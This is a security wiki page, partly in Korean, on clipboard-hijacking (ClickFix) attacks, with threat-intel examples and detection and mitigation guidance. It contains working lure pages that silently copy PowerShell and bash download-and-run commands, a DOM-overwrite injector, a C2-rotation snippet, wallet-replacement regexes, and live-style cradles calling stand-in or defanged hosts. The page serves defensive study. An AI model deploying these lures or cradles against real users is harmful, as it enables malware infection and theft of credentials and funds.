# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – 오래됐지만 여전히 유효한 조언

## Overview

Clipboard hijacking – *pastejacking*이라고도 함 – 은 사용자가 내용을 검사하지 않고 명령을 복사-붙여넣기하는 습관을 악용한다. 악성 웹 페이지(또는 Electron이나 Desktop 애플리케이션 같은 JavaScript를 사용할 수 있는 모든 컨텍스트)는 공격자가 제어하는 텍스트를 시스템 clipboard에 프로그램적으로 넣는다. 피해자는 보통 정교하게 작성된 소셜 엔지니어링 지시에 따라 **Win + R**(Run dialog), **Win + X**(Quick Access / PowerShell)를 누르거나 terminal을 열고 clipboard 내용을 *paste*하여 즉시 임의 명령을 실행하도록 유도된다.

**파일이 다운로드되지 않고 attachment가 열리지 않기 때문에**, 이 기법은 attachment, macros 또는 직접 명령 실행을 모니터링하는 대부분의 e-mail 및 web-content 보안 제어를 우회한다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer 같은 commodity malware family를 배포하는 phishing campaigns에서 널리 사용된다.

## Wallet-address replacement clippers

또 다른 **clipboard hijacking** 변종은 아예 명령을 붙여넣지 않는다: 피해자가 **cryptocurrency wallet address**를 복사할 때까지 기다렸다가, 붙여넣기 직전에 조용히 공격자가 제어하는 주소로 바꾼다. 이는 사용자가 보통 앞/뒤 몇 글자만 확인하는 긴 wallet 형식에 특히 효과적이다.

흔한 실제 특징:
- **Thin loader + nested payload**: 화면에 보이는 app/exe는 합법적인 trading 또는 "profit" tool처럼 보이지만, 실제 clipper는 bundle의 더 깊은 곳에 숨겨져 있다(예: 중첩된 Rust payload를 실행하는 .NET loader).
- **Regex-driven replacement**: malware는 `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` 같은 문자열 또는 일반적인 **44-character Solana-like** 문자열까지 매칭하여 공격자 wallet로 다시 쓴다.
- **Wallet rotation at scale**: 최신 Windows 샘플은 하나의 고정 주소 대신 currency별로 **수천 개**의 교체 wallet을 내장할 수 있어, 각 도난 이후 wallet reputation 소모를 줄인다.

### Windows clipper flow

흔한 구현 방식은 **`AddClipboardFormatListener`**로 등록된 숨겨진 window이다. clipboard가 업데이트될 때마다 malware는 보통 다음을 호출한다:
- **`OpenClipboard`** → 현재 clipboard data 접근.
- **`GetClipboardData`** → text 읽기.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet 문자열을 공격자 값으로 교체.

clippers에서 자주 보이는 최소 hunting regex:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
사용자 수준 persistence만으로도 영향은 충분하다. 관찰된 패턴 중 하나는:
- payload를 **`%APPDATA%\silke\silke.exe`**로 복사
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 아래에 **Startup-folder LNK** 생성

Detection ideas:
- clipboard APIs를 지속적으로 호출하면서 동시에 `%APPDATA%`와 사용자 **Startup** 폴더 아래에 쓰는 processes.
- 새 LNK/executable 생성 후 wallet-address clipboard rewrites가 뒤따르는 경우.
- 사용되지 않는 파일이 많이 들어 있고, nested binary를 시작하는 작은 launcher가 포함된 archives 또는 fake-software bundles.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS에서 일부 campaigns는 **`unlocker.command`** helper를 배포하고, Gatekeeper가 app이 damaged 되었거나 unidentified developer의 것이라고 말하면 피해자에게 우클릭 → **Open**을 하라고 안내한다. 이 script는 단순히 quarantine을 제거하고 근처의 `.app`을 실행한다:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` and `KeepAlive`가 있는 LaunchAgent

유용한 방어 정보로, 일부 샘플은 약 **30초마다** LaunchAgent와 wrapper를 다시 쓰는 **self-healing watchdog**를 구현합니다. 실행 중인 프로세스를 **죽이지 않고** 먼저 plist를 제거하면, 악성코드가 즉시 이를 다시 만들 수 있습니다. 안전한 정리 순서:
1. 활성 clipper 프로세스를 종료합니다.
2. LaunchAgent plist를 unload/delete 합니다.
3. `~/launch.sh`와 복사된 payload를 삭제합니다.

### 배포 노트: 강제 배수 역할을 하는 가짜 평판

이 계열에서는 악성코드 자체는 기술적으로 단순하게 유지할 수 있지만, **distribution layer**가 핵심 역할을 합니다: 가짜 GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, 그리고 benign-looking VirusTotal comments/votes를 사용해 실행 전에 binary가 신뢰할 수 있어 보이게 만듭니다.

## 강제 copy 버튼과 숨겨진 payloads (macOS one-liners)

일부 macOS infostealers는 installer sites(예: Homebrew)를 복제하고 **“Copy” button 사용을 강제**하여 사용자가 보이는 텍스트만 선택하지 못하게 합니다. clipboard entry에는 예상한 installer command와 함께 Base64 payload가 추가로 포함됩니다(예: `...; echo <b64> | base64 -d | sh`), 그래서 한 번 paste하면 UI가 추가 stage를 숨기는 동안 두 단계가 모두 실행됩니다.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 캠페인들은 `document.execCommand('copy')`를 사용했으며, 최신 캠페인들은 비동기 **Clipboard API** (`navigator.clipboard.writeText`)에 의존한다.

## The ClickFix / ClearFake Flow

1. 사용자가 타이포스쿼팅되었거나 침해된 사이트를 방문한다(예: `docusign.sa[.]com`)
2. 주입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` 헬퍼를 호출해 Base64로 인코딩된 PowerShell one-liner를 클립보드에 조용히 저장한다.
3. HTML 지시문이 피해자에게 다음을 안내한다: *“**Win + R**을 누르고, 명령을 붙여넣은 다음 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 아카이브를 다운로드하고, 그 안에는 정상 실행 파일과 악성 DLL이 함께 들어 있다(전형적인 DLL sideloading).
5. 로더는 추가 단계들을 복호화하고, shellcode를 주입하며 persistence를 설치한다(예: scheduled task) – 최종적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행한다.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 자신의 디렉터리에서 `msvcp140.dll`을 찾습니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 resolve하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 뒤, 롤링 XOR 키 `"https://google.com/"`를 사용해 복호화하고, 최종 shellcode를 주입한 다음 **client32.exe**(NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt` 다운로드
2. **cscript.exe** 내부에서 JScript downloader 실행
3. MSI payload를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll` 드롭 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하며, 이 스크립트는 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출한 뒤, `extrac32`와 파일 결합을 통해 `AutoIt3.exe`를 재구성하고, 마지막으로 브라우저 자격 증명을 `sumeriavgv.digital`로 exfiltrates하는 `.a3x` 스크립트를 실행한다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고, 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one-liner를 붙여넣도록 지시한 뒤, 이를 지속화하고 C2를 매일 회전시킨다. 관찰된 예시 체인은:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특징
- 일반적인 검사로는 알아보기 어렵도록 실행 시점에 URL을 역순으로 난독화함.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 자기 자신을 유지하고, 현재 날짜를 기준으로 C2를 선택함 - 이를 통해 빠른 도메인 로테이션이 가능함.

날짜로 C2를 로테이션하는 데 사용되는 최소 JS 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계는 보통 persistence를 설정하고 RAT(예: PureHVNC)를 가져오는 loader를 배포하며, 종종 TLS를 hardcoded certificate에 pinning하고 트래픽을 chunking합니다.

이 변종에 특화된 탐지 아이디어
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`의 LNK가 `%TEMP%`/`%APPDATA%` 아래 JS 경로로 WScript/CScript를 호출.
- Registry/RunMRU 및 command-line telemetry에 `.split('').reverse().join('')` 또는 `eval(a.responseText)` 포함.
- 긴 command line 없이 긴 script를 주입하기 위해 큰 stdin payload를 사용하는 반복적인 `powershell -NoProfile -NonInteractive -Command -`.
- 이후 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` 같은 LOLBins를 updater처럼 보이는 task/path(예: `\GoogleSystem\GoogleUpdater`) 아래에서 실행하는 Scheduled Tasks.

Threat hunting
- 매일 rotating 되는 C2 hostnames와 URL에 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴.
- clipboard write events 뒤에 Win+R paste, 그 직후 `powershell.exe` 실행을 상관분석.

Blue teams는 clipboard, process-creation, registry telemetry를 결합해 pastejacking abuse를 pinpoint할 수 있습니다:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** command history를 유지합니다 – 비정상적인 Base64 / obfuscated entries를 확인하세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe`이고 `NewProcessName`이 `{ `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }` 중 하나인 경우.
* Event ID **4663**: 의심스러운 4688 event 직전 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 temporary folders 아래의 file creations.
* EDR clipboard sensors(있다면) – `Clipboard Write` 직후 새로운 PowerShell process와 correlate.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 campaigns는 fake CDN/browser verification pages("Just a moment…", IUAM-style)를 대량 생성해 사용자가 clipboard에서 OS-specific commands를 native consoles로 복사하도록 유도합니다. 이는 execution을 browser sandbox 밖으로 우회시키며 Windows와 macOS 전반에서 동작합니다.

builder-generated pages의 핵심 특징
- `navigator.userAgent`를 통한 OS detection으로 payload를 맞춤화(Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에는 illusion 유지를 위한 optional decoys/no-ops.
- 눈에 보이는 text와 clipboard content가 다를 수 있는 상태에서 benign UI action(checkbox/Copy) 시 자동 clipboard-copy.
- 모바일 차단과 단계별 안내 popover: Windows → Win+R→paste→Enter; macOS → Terminal 열기→paste→Enter.
- optional obfuscation과 single-file injector로 compromised site의 DOM을 Tailwind-styled verification UI로 overwrite(새 domain registration 불필요).

예시: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행의 지속성
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 터미널이 닫힌 뒤에도 실행이 계속되어, 눈에 띄는 흔적을 줄일 수 있습니다.

손상된 사이트에서 인플레이스 페이지 탈취
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Clipboard API를 verification widgets에 바인딩하는 Pages; 표시된 text와 clipboard payload 간의 mismatch; `navigator.userAgent` branching; 의심스러운 contexts에서의 Tailwind + single-page replace.
- Windows endpoint: 브라우저 interaction 직후 `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%`에서 실행되는 batch/MSI installers.
- macOS endpoint: Terminal/iTerm이 browser events 근처에서 `bash`/`curl`/`base64 -d`를 `nohup`과 함께 spawning; terminal close 이후에도 살아남는 background jobs.
- `RunMRU` Win+R history와 clipboard writes를 이후의 console process creation과 correlate.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake는 계속해서 WordPress sites를 compromise하고, external hosts(Cloudflare Workers, GitHub/jsDelivr)를 체인하는 loader JavaScript와 blockchain “etherhiding” calls(예: `bsc-testnet.drpc[.]org` 같은 Binance Smart Chain API endpoints로의 POSTs)를 주입해 current lure logic을 가져온다. 최근 overlays는 무엇이든 다운로드하는 대신 사용자에게 one-liner를 copy/paste 하라고 지시하는 fake CAPTCHAs를 heavily use 한다(T1204.004).
- Initial execution은 점점 signed script hosts/LOLBAS에 delegated 된다. 2026년 1월 chains는 이전의 `mshta` 사용을 `WScript.exe`를 통해 실행되는 built-in `SyncAppvPublishingServer.vbs`로 바꾸었고, aliases/wildcards가 포함된 PowerShell-like arguments를 전달해 remote content를 fetch했다:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs`는 서명되어 있고 보통 App-V에 사용되며; `WScript.exe`와 비정상적인 인자들(`gal`/`gcm` alias, wildcarded cmdlets, jsDelivr URLs)과 함께 사용되면 ClearFake를 위한 high-signal LOLBAS stage가 됩니다.
- 2026년 2월 fake CAPTCHA payloads는 순수 PowerShell download cradles로 다시 전환되었습니다. 두 개의 live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain은 in-memory `iex(irm ...)` grabber이고; second는 `WinHttp.WinHttpRequest.5.1`을 통해 stage를 만들고, 임시 `.ps1`를 쓰고, 그다음 hidden window에서 `-ep bypass`로 실행한다.

이러한 변종에 대한 Detection/hunting tips
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 clipboard writes/Win+R 직후의 PowerShell cradles.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, 또는 raw IP `iex(irm ...)` 패턴.
- Network: web browsing 직후 script hosts/PowerShell에서 CDN worker hosts 또는 blockchain RPC endpoints로의 outbound.
- File/registry: `%TEMP%` 아래의 temporary `.ps1` 생성과 이런 one-liners를 포함하는 RunMRU entries; external URLs 또는 obfuscated alias strings와 함께 실행되는 signed-script LOLBAS(WScript/cscript/mshta)에 대해 block/alert.

## Mitigations

1. Browser hardening – clipboard write-access(`dom.events.asyncClipboard.clipboardItem` 등)을 비활성화하거나 user gesture를 요구한다.
2. Security awareness – 사용자가 민감한 commands를 *직접 타이핑*하거나 먼저 text editor에 붙여넣도록 교육한다.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control로 arbitrary one-liners를 차단한다.
4. Network controls – 알려진 pastejacking 및 malware C2 domains로의 outbound requests를 차단한다.

## Related Tricks

* **Discord Invite Hijacking**은 종종 사용자를 malicious server로 유도한 뒤 같은 ClickFix approach를 악용한다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
